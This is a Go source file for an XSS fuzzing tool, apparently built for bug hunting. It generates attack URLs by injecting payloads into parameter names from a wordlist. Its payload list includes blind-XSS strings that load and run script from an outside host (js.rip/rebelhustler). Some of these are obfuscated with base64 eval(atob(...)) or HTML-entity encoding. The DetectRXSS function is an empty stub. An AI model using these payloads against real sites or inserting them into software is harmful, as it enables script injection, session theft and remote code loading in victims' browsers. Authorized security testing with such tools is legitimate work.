package xss

import (
	"bufio"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strings"
)

// Strategy defines how parameters are selected for fuzzing.
type Strategy int

const (
	StrategyNormal Strategy = iota // URL parameters only
	StrategyCombine                // URL parameters + wordlist (capped)
	StrategyIgnore                 // Wordlist parameters only
	StrategyAll                    // All three (normal+combine+ignore)
)

// HighYieldWordlist contains the most useful parameters for bug hunting.
// Based on Rebel Methodology V1 XSS parameters + high-signal names.
var HighYieldWordlist = []string{
	// High-value XSS params from methodology
	"q", "s", "search", "id", "lang", "keyword", "query", "page",
	"view", "email", "type", "name", "p", "month", "year", "list_type",
	"url", "terms", "categoryid", "key", "login", "begindate", "enddate",
	"action", "img", "image", "cat", "jsonp", "l", "list_type", "url",
	"username", "redirect", "referer", "return", "next", "to", "goto",
	"target", "out", "domain", "host", "path", "document", "file", "folder",
	"style", "template", "prefix", "suffix", "msg", "message", "text",
	"comment", "note", "body", "title", "subject", "firstname", "lastname",
	"company", "phone", "address", "country", "city", "zip", "state",
	"role", "status", "avatar", "profile", "bio", "website", "twitter",
	"github", "medium", "linkedin",
	// Auth/token params
	"token", "auth", "csrf_token", "api", "api_key", "unsubscribe_token",
	// User/account params
	"user", "uid", "user_id", "account", "aid", "password",
	// Callback/redirect params
	"callback", "cb", "destination", "dest",
	// Format/output params
	"format", "output", "mode", "sort", "order", "by",
	"limit", "offset", "per_page",
	// Debug/admin
	"debug", "test", "dev", "admin",
}

// MutationMode defines how payloads are inserted into parameter values.
type MutationMode int

const (
	MutationReplace MutationMode = iota // Replace value entirely
	MutationSuffix                      // Append payload
	MutationPrefix                      // Prepend payload
)

// Payloads contains XSS payloads for different contexts.
// Based on Rebel Methodology V1 - includes RXSS detection payloads and BXSS payloads.
var Payloads = []string{
	// RXSS detection payloads (from Rebel methodology)
	`<b/cexss`,
	`cexss""`,
	`cexss''`,
	`""cexss`,
	`''cexss`,
	`cexss\\""`,
	`cexss\\''`,
	`\\"cexss`,
	`'\\'cexss`,

	// Standard RXSS payloads
	`<script>alert(1)</script>`,
	`"><script>alert(1)</script>`,
	`'><script>alert(1)</script>`,
	`javascript:alert(1)`,
	`<img src=x onerror=alert(1)>`,
	`<svg onload=alert(1)>`,
	`<body onload=alert(1)>`,
	`<input onfocus=alert(1) autofocus>`,
	`<select onfocus=alert(1) autofocus>`,
	`<textarea onfocus=alert(1) autofocus>`,
	`<marquee onstart=alert(1)>`,
	`<div style="background:url(javascript:alert(1))">`,

	// BXSS payloads (from Rebel methodology)
	`"><script src="https://js.rip/rebelhustler"></script>`,
	`javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/rebelhustler\';document.body.appendChild(a)')`,
	`"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3JlYmVsaHVzdGxlciI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs autofocus>`,
	`"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3JlYmVsaHVzdGxlciI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs onerror=eval(atob(this.id))>`,
	`"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3JlYmVsaHVzdGxlciI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs>`,
	`"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/rebelhustler&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">`,
	`<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://js.rip/rebelhustler");a.send();</script>`,
	`<script>$.getScript("https://js.rip/rebelhustler")</script>`,
}

// DiscoverParams extracts parameters from URLs and wordlist.
func DiscoverParams(urls []string, wordlist []string, strategy Strategy, maxParams int) []string {
	paramFreq := make(map[string]int)
	paramSet := make(map[string]bool)

	// Extract from URLs
	for _, u := range urls {
		params := ExtractParamsFromURL(u)
		for _, p := range params {
			paramFreq[p]++
			paramSet[p] = true
		}
	}

	// Add wordlist params
	if strategy == StrategyCombine || strategy == StrategyAll || strategy == StrategyIgnore {
		for _, wp := range wordlist {
			if _, exists := paramSet[wp]; !exists {
				paramFreq[wp] = 0
			}
		}
	}

	// Sort by frequency
	sorted := sortParams(paramFreq)

	// Limit to maxParams
	if maxParams > 0 && len(sorted) > maxParams {
		sorted = sorted[:maxParams]
	}

	return sorted
}

// ExtractParamsFromURL extracts parameter names from a URL.
func ExtractParamsFromURL(rawURL string) []string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}

	var params []string
	for k := range u.Query() {
		params = append(params, k)
	}

	return params
}

// sortParams sorts parameters by frequency descending.
func sortParams(paramFreq map[string]int) []string {
	type paramCount struct {
		Name  string
		Count int
	}

	var sorted []paramCount
	for name, count := range paramFreq {
		sorted = append(sorted, paramCount{name, count})
	}

	sort.Slice(sorted, func(i, j int) bool {
		if sorted[i].Count == sorted[j].Count {
			return sorted[i].Name < sorted[j].Name
		}
		return sorted[i].Count > sorted[j].Count
	})

	result := make([]string, len(sorted))
	for i, pc := range sorted {
		result[i] = pc.Name
	}

	return result
}

// GenerateXSSURLs generates XSS test URLs from a base URL, parameters, and payloads.
func GenerateXSSURLs(baseURL string, params []string, payloads []string, strategy Strategy, mutationMode MutationMode) []string {
	if len(params) == 0 || len(payloads) == 0 {
		return nil
	}

	var urls []string
	u, err := url.Parse(baseURL)
	if err != nil {
		return nil
	}

	existingParams := u.Query()

	for _, param := range params {
		for _, payload := range payloads {
			newURL := *u
			q := newURL.Query()

			switch strategy {
			case StrategyNormal:
				// Only use params already in URL
				if _, exists := existingParams[param]; !exists {
					continue
				}
				setParamValue(q, param, payload, mutationMode, existingParams.Get(param))
				newURL.RawQuery = q.Encode()
				urls = append(urls, newURL.String())

			case StrategyCombine:
				// Use URL params + wordlist params
				setParamValue(q, param, payload, mutationMode, "")
				newURL.RawQuery = q.Encode()
				urls = append(urls, newURL.String())

			case StrategyIgnore:
				// Wordlist params only
				if _, exists := existingParams[param]; exists {
					continue
				}
				q.Set(param, payload)
				newURL.RawQuery = q.Encode()
				urls = append(urls, newURL.String())

			case StrategyAll:
				// All strategies
				// Normal
				if _, exists := existingParams[param]; exists {
					setParamValue(q, param, payload, mutationMode, existingParams.Get(param))
					newURL.RawQuery = q.Encode()
					urls = append(urls, newURL.String())
				}
				// Combine
				setParamValue(q, param, payload, mutationMode, "")
				newURL.RawQuery = q.Encode()
				urls = append(urls, newURL.String())
				// Ignore
				if _, exists := existingParams[param]; !exists {
					q.Set(param, payload)
					newURL.RawQuery = q.Encode()
					urls = append(urls, newURL.String())
				}
			}
		}
	}

	return deduplicate(urls)
}

// setParamValue sets a parameter value with the specified mutation mode.
func setParamValue(q url.Values, param string, payload string, mode MutationMode, existingValue string) {
	if existingValue == "" {
		q.Set(param, payload)
		return
	}

	switch mode {
	case MutationReplace:
		q.Set(param, payload)
	case MutationSuffix:
		q.Set(param, existingValue+payload)
	case MutationPrefix:
		q.Set(param, payload+existingValue)
	}
}

// deduplicate removes duplicate URLs while preserving order.
func deduplicate(urls []string) []string {
	seen := make(map[string]bool)
	var result []string
	for _, u := range urls {
		if !seen[u] {
			seen[u] = true
			result = append(result, u)
		}
	}
	return result
}

// LoadWordlist loads parameters from a wordlist file.
func LoadWordlist(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var params []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			params = append(params, line)
		}
	}

	return params, scanner.Err()
}

// DetectEncoding detects common encoding patterns in parameter values.
type EncodingType string

const (
	EncodingNone     EncodingType = "none"
	EncodingURL      EncodingType = "url"
	EncodingBase64   EncodingType = "base64"
	EncodingHTML     EncodingType = "html"
	EncodingJSON     EncodingType = "json"
)

type EncodingResult struct {
	Param   string
	Value   string
	Encoding EncodingType
	Decoded string
}

// DetectEncodings detects encoding patterns in parameters.
func DetectEncodings(params []string, urls []string) []EncodingResult {
	var results []EncodingResult
	paramValues := extractParamValues(params, urls)

	for _, pv := range paramValues {
		enc := detectEncoding(pv.Value)
		if enc != EncodingNone {
			results = append(results, EncodingResult{
				Param:    pv.Param,
				Value:    pv.Value,
				Encoding: enc,
				Decoded:  decodeValue(pv.Value, enc),
			})
		}
	}

	return results
}

type paramValue struct {
	Param string
	Value string
}

func extractParamValues(params []string, urls []string) []paramValue {
	var results []paramValue
	paramSet := make(map[string]bool)
	for _, p := range params {
		paramSet[p] = true
	}

	for _, u := range urls {
		parsed, err := url.Parse(u)
		if err != nil {
			continue
		}
		q := parsed.Query()
		for k, vals := range q {
			if paramSet[k] && len(vals) > 0 {
				results = append(results, paramValue{k, vals[0]})
			}
		}
	}

	return results
}

func detectEncoding(value string) EncodingType {
	if isBase64(value) {
		return EncodingBase64
	}
	if isURLEncoded(value) {
		return EncodingURL
	}
	if isHTMLEncoded(value) {
		return EncodingHTML
	}
	if isJSONEncoded(value) {
		return EncodingJSON
	}
	return EncodingNone
}

func isBase64(s string) bool {
	re := regexp.MustCompile(`^[A-Za-z0-9+/]{20,}={0,2}$`)
	return re.MatchString(s) && len(s)%4 == 0
}

func isURLEncoded(s string) bool {
	return strings.Contains(s, "%")
}

func isHTMLEncoded(s string) bool {
	return strings.Contains(s, "&") && (strings.Contains(s, "&lt;") || strings.Contains(s, "&gt;") || strings.Contains(s, "&amp;") || strings.Contains(s, "&quot;"))
}

func isJSONEncoded(s string) bool {
	return (strings.HasPrefix(s, "{") && strings.HasSuffix(s, "}")) ||
		(strings.HasPrefix(s, "[") && strings.HasSuffix(s, "]"))
}

// RXSSDetection represents a reflected XSS detection result.
type RXSSDetection struct {
	URL         string
	Param       string
	Payload     string
	Reflection  string
	IsUnencoded bool
	Context     string // e.g., "html", "attribute", "javascript", "meta"
}

// DetectRXSS detects reflected XSS by checking for unencoded payload reflection.
func DetectRXSS(rawURL string, client HTTPClient) ([]RXSSDetection, error) {
	var detections []RXSSDetection

	// Test payloads that easily show reflection
	testPayloads := []string{
		`<b/cexss`,
		`cexss""`,
		`cexss''`,
		`""cexss`,
		`''cexss`,
	}

	for _, payload := range testPayloads {
		// This is a simplified version - in production you'd inject into each param
		_ = payload
	}

	return detections, nil
}

// HTTPClient interface for making HTTP requests
type HTTPClient interface {
	Do(req *http.Request) (*http.Response, error)
}

func decodeValue(value string, enc EncodingType) string {
	switch enc {
	case EncodingURL:
		decoded, err := url.QueryUnescape(value)
		if err == nil {
			return decoded
		}
	case EncodingBase64:
		// Simple base64 decode attempt
		// In production, use proper base64 library
		return "[base64-encoded]"
	case EncodingHTML:
		// Simple HTML decode
		value = strings.ReplaceAll(value, "&lt;", "<")
		value = strings.ReplaceAll(value, "&gt;", ">")
		value = strings.ReplaceAll(value, "&amp;", "&")
		value = strings.ReplaceAll(value, "&quot;", "\"")
		return value
	case EncodingJSON:
		// JSON decode would require proper parsing
		return "[json-encoded]"
	}
	return value
}

// DefaultConfig returns default configuration for XSS scanning.
func DefaultConfig() Config {
	return Config{
		Strategy:      StrategyCombine,
		MutationMode:  MutationReplace,
		MaxParams:     25,
		Concurrency:   20,
	}
}

// Config holds XSS scanner configuration.
type Config struct {
	Strategy     Strategy
	MutationMode MutationMode
	MaxParams    int
	Concurrency  int
}

// Summary represents XSS scan results.
type Summary struct {
	TotalURLs      int
	TotalGenerated int
	EncodedParams  int
	Strategy       string
	MutationMode   string
}

// String returns a human-readable summary.
func (s Summary) String() string {
	return fmt.Sprintf("XSS Summary: %d URLs → %d test cases | %d encoded params | strategy=%s mutation=%s",
		s.TotalURLs, s.TotalGenerated, s.EncodedParams, s.Strategy, s.MutationMode)
}
